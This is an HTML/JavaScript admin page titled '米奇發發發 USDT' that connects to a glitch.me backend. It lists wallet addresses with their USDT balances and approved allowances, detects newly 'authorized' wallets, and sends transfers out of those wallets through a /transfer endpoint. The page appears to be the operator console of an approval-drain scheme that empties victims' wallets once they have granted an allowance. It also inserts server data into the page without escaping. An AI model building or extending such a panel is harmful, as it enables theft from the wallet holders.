<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>米奇發發發 USDT</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css" rel="stylesheet">
    <!-- PWA 支持 -->
    <link rel="manifest" href="/manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon" href="/icon.png">
    <style>
        .wallet-card {
            margin-bottom: 15px;
        }
        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }
        .status-authorized {
            background-color: #28a745;
        }
        .status-unauthorized {
            background-color: #dc3545;
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1050;
        }
        .page {
            min-height: 100vh;
        }
        #transferStatus {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <!-- 登入頁面 -->
    <div id="loginPage" class="page" style="display: none;">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-6 col-lg-4">
                    <div class="card mt-5">
                        <div class="card-body">
                            <h4 class="text-center mb-4">登入</h4>
                            <form id="loginForm" onsubmit="return handleLogin(event)">
                                <div class="mb-3">
                                    <input type="text" class="form-control" id="username" value="admin" readonly>
                                </div>
                                <div class="mb-3">
                                    <input type="password" class="form-control" id="password" placeholder="請輸入密碼">
                                </div>
                                <button type="submit" class="btn btn-primary w-100">登入</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- 主要內容 -->
    <div id="mainContent" class="page">
        <div class="container mt-4">
            <h2 class="text-center mb-4">米奇發發發 USDT</h2>
            
            <!-- 系統狀態 -->
            <div class="card mb-4">
                <div class="card-body">
                    <h5 class="card-title">系統狀態</h5>
                    <div class="row">
                        <div class="col-6">
                            <p class="mb-1">已授權錢包數量: <span id="walletCount">0</span></p>
                        </div>
                        <div class="col-6 text-end">
                            <button class="btn btn-primary btn-sm" onclick="detectAuthorizedWallets()">
                                <i class="bi bi-search"></i> 檢查
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- 錢包列表 -->
            <div id="walletsList"></div>

            <!-- 新增錢包 -->
            <div class="card mt-4">
                <div class="card-body">
                    <div class="input-group">
                        <input type="text" id="newWalletAddress" class="form-control" placeholder="輸入錢包地址">
                        <button class="btn btn-primary" onclick="addNewWallet()">新增錢包</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- 轉帳確認視窗 -->
        <div class="modal fade" id="transferModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">確認轉帳</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label">轉帳金額 (USDT)</label>
                            <input type="number" class="form-control" id="transferAmount" step="0.000001">
                        </div>
                        <div id="transferStatus" class="alert" style="display: none;"></div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
                        <button type="button" class="btn btn-primary" onclick="confirmTransfer()">確認轉帳</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Toast 通知容器 -->
        <div class="toast-container"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        // 全局變量
        let token = localStorage.getItem('token');
        const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me'; // 如果前後端在同一域名下，可以留空
        let transferModal;
        let currentTransferWallet = '';

        // 頁面顯示控制
        function showLoginPage() {
            document.getElementById('loginPage').style.display = 'block';
            document.getElementById('mainContent').style.display = 'none';
        }

        function showHomePage() {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        }

        // 登入相關函數
        async function handleLogin(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                const response = await axios.post(`${API_BASE_URL}/login`, { username, password });
                token = response.data.token;
                localStorage.setItem('token', token);
                axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
                await loadSavedWallets();
                showHomePage();
            } catch (error) {
                showToast('登入失敗: ' + (error.response?.data?.error || error.message), 'danger');
            }
        }

        // Toast 通知
        function showToast(message, type = 'info') {
            const toastContainer = document.querySelector('.toast-container');
            const toastHtml = `
                <div class="toast align-items-center text-white bg-${type} border-0" role="alert" aria-live="assertive" aria-atomic="true">
                    <div class="d-flex">
                        <div class="toast-body">${message}</div>
                        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
                    </div>
                </div>
            `;
            toastContainer.insertAdjacentHTML('beforeend', toastHtml);
            const toastElement = toastContainer.lastElementChild;
            const toast = new bootstrap.Toast(toastElement);
            toast.show();
            setTimeout(() => toastElement.remove(), 5000);
        }

        // 錢包管理
        async function loadSavedWallets() {
            try {
                const response = await axios.get(`${API_BASE_URL}/get-wallets`);
                const wallets = response.data.wallets;
                if (wallets && wallets.length > 0) {
                    refreshWalletsList(wallets);
                    refreshAllBalances();
                    updateWalletCount(wallets.length);
                }
            } catch (error) {
                if (error.response?.status === 401) {
                    showLoginPage();
                    return;
                }
                console.error('Load wallets error:', error);
                showToast('加載錢包失敗: ' + error.message, 'danger');
            }
        }

        function refreshWalletsList(wallets) {
            const walletsListHtml = wallets.map(wallet => `
                <div class="card wallet-card">
                    <div class="card-body">
                        <div class="d-flex justify-content-between align-items-center">
                            <div>
                                <span class="status-indicator ${wallet.isAuthorized ? 'status-authorized' : 'status-unauthorized'}"></span>
                                <span class="wallet-address">${wallet.address}</span>
                            </div>
                            <div>
                                <button class="btn btn-danger btn-sm me-2" onclick="deleteWallet('${wallet.address}')">
                                    <i class="bi bi-trash"></i>
                                </button>
                            </div>
                        </div>
                        <div class="mt-2">
                            <p class="mb-1">餘額: ${wallet.balance || '0'} USDT</p>
                            <p class="mb-1">授權額度: ${wallet.allowance || '0'} USDT</p>
                            ${wallet.isAuthorized ? `
                                <button class="btn btn-primary btn-sm mt-2" onclick="showTransferModal('${wallet.address}')">
                                    轉帳
                                </button>
                            ` : ''}
                        </div>
                    </div>
                </div>
            `).join('');
            document.getElementById('walletsList').innerHTML = walletsListHtml;
        }

        async function addNewWallet() {
            const address = document.getElementById('newWalletAddress').value.trim();
            if (!address) {
                showToast('請輸入錢包地址', 'warning');
                return;
            }

            try {
                const response = await axios.post(`${API_BASE_URL}/save-wallets`, {
                    wallets: [{ address }]
                });
                document.getElementById('newWalletAddress').value = '';
                await loadSavedWallets();
                showToast('新增錢包成功', 'success');
            } catch (error) {
                showToast('新增錢包失敗: ' + error.message, 'danger');
            }
        }

        async function deleteWallet(address) {
            if (!confirm('確定要刪除此錢包嗎？')) return;

            try {
                const response = await axios.get(`${API_BASE_URL}/get-wallets`);
                const wallets = response.data.wallets.filter(w => w.address !== address);
                await axios.post(`${API_BASE_URL}/save-wallets`, { wallets });
                await loadSavedWallets();
                showToast('刪除錢包成功', 'success');
            } catch (error) {
                showToast('刪除錢包失敗: ' + error.message, 'danger');
            }
        }

        async function refreshAllBalances() {
            const walletsList = document.getElementById('walletsList');
            const walletCards = walletsList.getElementsByClassName('wallet-card');
            
            for (const card of walletCards) {
                const address = card.querySelector('.wallet-address').textContent;
                try {
                    const response = await axios.get(`${API_BASE_URL}/balance/${address}`);
                    const { balance, allowance, isAuthorized } = response.data;
                    
                    // 更新狀態指示器
                    const statusIndicator = card.querySelector('.status-indicator');
                    statusIndicator.className = `status-indicator ${isAuthorized ? 'status-authorized' : 'status-unauthorized'}`;
                    
                    // 更新餘額和授權額度
                    const balanceElement = card.querySelector('p:nth-child(1)');
                    const allowanceElement = card.querySelector('p:nth-child(2)');
                    balanceElement.textContent = `餘額: ${balance} USDT`;
                    allowanceElement.textContent = `授權額度: ${allowance} USDT`;
                    
                    // 更新轉帳按鈕
                    const transferButton = card.querySelector('button.btn-primary');
                    if (isAuthorized && !transferButton) {
                        const buttonContainer = card.querySelector('.mt-2');
                        buttonContainer.innerHTML = `
                            <button class="btn btn-primary btn-sm" onclick="showTransferModal('${address}')">
                                轉帳
                            </button>
                        `;
                    } else if (!isAuthorized && transferButton) {
                        transferButton.remove();
                    }
                } catch (error) {
                    console.error(`Error refreshing balance for ${address}:`, error);
                }
            }
        }

        async function detectAuthorizedWallets() {
            try {
                const response = await axios.get(`${API_BASE_URL}/authorized-wallets`);
                const authorizedWallets = response.data;
                if (authorizedWallets.length > 0) {
                    await loadSavedWallets();
                    showToast(`檢測到 ${authorizedWallets.length} 個已授權錢包`, 'success');
                } else {
                    showToast('未檢測到新的已授權錢包', 'info');
                }
            } catch (error) {
                showToast('檢測錢包失敗: ' + error.message, 'danger');
            }
        }

        function updateWalletCount(count) {
            document.getElementById('walletCount').textContent = count;
        }

        // 轉帳相關
        function showTransferModal(address) {
            currentTransferWallet = address;
            document.getElementById('transferAmount').value = '';
            document.getElementById('transferStatus').style.display = 'none';
            transferModal.show();
        }

        async function confirmTransfer() {
            const amount = document.getElementById('transferAmount').value;
            if (!amount || amount <= 0) {
                showToast('請輸入有效的轉帳金額', 'warning');
                return;
            }

            const statusElement = document.getElementById('transferStatus');
            statusElement.className = 'alert alert-info';
            statusElement.style.display = 'block';
            statusElement.textContent = '交易處理中...';

            try {
                const response = await axios.post(`${API_BASE_URL}/transfer`, {
                    fromAddress: currentTransferWallet,
                    amount: amount
                });

                const txId = response.data.transaction;
                let confirmations = 0;
                
                const checkStatus = async () => {
                    try {
                        const statusResponse = await axios.get(`${API_BASE_URL}/transaction-status/${txId}`);
                        const { status, confirmCount } = statusResponse.data;

                        if (status === 'SUCCESS') {
                            statusElement.className = 'alert alert-success';
                            statusElement.textContent = '轉帳成功！';
                            await refreshAllBalances();
                            setTimeout(() => transferModal.hide(), 2000);
                        } else if (status === 'FAILED') {
                            statusElement.className = 'alert alert-danger';
                            statusElement.textContent = '轉帳失敗';
                        } else {
                            statusElement.textContent = `交易處理中... (${confirmCount} 確認)`;
                            setTimeout(checkStatus, 3000);
                        }
                    } catch (error) {
                        statusElement.className = 'alert alert-danger';
                        statusElement.textContent = '檢查交易狀態失敗';
                    }
                };

                checkStatus();
            } catch (error) {
                statusElement.className = 'alert alert-danger';
                statusElement.textContent = '轉帳失敗: ' + (error.response?.data?.error || error.message);
            }
        }

        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            transferModal = new bootstrap.Modal(document.getElementById('transferModal'));
            
            // 設置 axios 默認 header
            if (token) {
                axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
                showHomePage();
                loadSavedWallets();
            } else {
                showLoginPage();
            }

            // 自動刷新
            setInterval(refreshAllBalances, 60000);
            
            // 註冊 Service Worker
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/sw.js')
                    .then(registration => {
                        console.log('ServiceWorker registration successful');
                    })
                    .catch(err => {
                        console.log('ServiceWorker registration failed: ', err);
                    });
            }
        });
    </script>
</body>
</html>
